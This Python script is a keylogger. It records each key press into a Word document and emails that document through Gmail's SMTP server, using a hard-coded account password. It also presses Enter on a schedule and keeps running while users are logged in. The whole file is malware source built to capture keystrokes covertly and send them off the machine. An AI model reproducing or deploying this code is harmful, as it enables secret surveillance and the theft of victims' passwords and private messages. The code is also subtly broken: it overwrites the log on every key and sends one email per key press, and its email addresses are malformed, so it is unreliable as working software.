import keyboard
from docx import Document
import schedule
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import psutil
import os

# Function to handle key events
def on_key(event):
    # Open or create a Word document
    doc = Document()
    # Add the pressed key to the document
    doc.add_paragraph(event.name)

    # Save the document as a .docx file
    doc.save('keylog.docx')

    # Email configuration
    sender_email = 'cldoraemon123nobita'
    receiver_email = 'kk91190823'
    subject = 'Keylog Document'
    body = 'Please find the attached keylog document.'

    # Compose the email message
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    # Attach the keylog document
    filename = 'keylog.docx'
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {filename}')
    message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, 'Success@24')
            server.sendmail(sender_email, receiver_email, message.as_string())
        print('Email sent successfully!')
    except smtplib.SMTPException as e:
        print(f'An error occurred while sending the email: {e}')

# Register the callback function for key press events
keyboard.on_press(on_key)

# Schedule the job to run every 2 hours
schedule.every(2).hours.do(lambda: keyboard.press_and_release('enter'))

# Function to check if the system is active
def is_system_active():
    return any(user.name != 'SYSTEM' for user in psutil.users())

# Run the script whenever the system is active
while is_system_active():
    schedule.run_pending()
    time.sleep(1)
      